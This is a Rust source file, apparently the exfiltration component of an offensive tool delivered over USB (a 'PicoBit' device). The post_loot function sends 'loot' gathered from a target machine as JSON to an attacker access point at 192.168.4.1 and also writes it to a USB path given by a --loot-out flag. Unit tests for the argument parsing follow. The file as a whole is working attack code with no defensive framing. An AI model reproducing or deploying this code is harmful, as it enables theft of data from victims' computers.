use serde_json::Value;
use std::path::PathBuf;

const LOOT_URL: &str = "http://192.168.4.1/api/loot";

pub fn post_loot(payload: &Value) {
    let body = payload.to_string();
    let loot_out = loot_out_path();

    // USB delivery may run while the target has no route to the PicoBit AP.
    // Write the loot file first when a USB output path was provided, then try
    // the HTTP fast path as a best-effort live update.
    if let Some(path) = loot_out.as_ref() {
        let _ = std::fs::write(path, &body);
    }

    let posted = post_loot_http(&body);
    if !posted {
        if let Some(path) = loot_out.as_ref() {
            let _ = std::fs::write(path, &body);
        }
    }
}

fn post_loot_http(body: &str) -> bool {
    ureq::post(LOOT_URL)
        .set("Content-Type", "application/json")
        .send_string(body)
        .map(|_| true)
        .unwrap_or(false)
}

fn loot_out_path() -> Option<PathBuf> {
    loot_out_path_from(std::env::args())
}

fn loot_out_path_from<I, S>(args: I) -> Option<PathBuf>
where
    I: IntoIterator<Item = S>,
    S: Into<String>,
{
    let mut iter = args.into_iter().map(Into::into);
    while let Some(arg) = iter.next() {
        if arg == "--loot-out" {
            return iter.next().map(PathBuf::from);
        }
        if let Some(path) = arg.strip_prefix("--loot-out=") {
            if !path.is_empty() {
                return Some(PathBuf::from(path));
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::loot_out_path_from;
    use std::path::PathBuf;

    #[test]
    fn parses_loot_out_from_split_argument() {
        assert_eq!(
            loot_out_path_from(["agent", "--loot-out", "/Volumes/PICOBIT/loot-usb.json"]),
            Some(PathBuf::from("/Volumes/PICOBIT/loot-usb.json"))
        );
    }

    #[test]
    fn parses_loot_out_from_equals_argument() {
        assert_eq!(
            loot_out_path_from(["agent", "--loot-out=X:/loot-usb.json"]),
            Some(PathBuf::from("X:/loot-usb.json"))
        );
    }
}
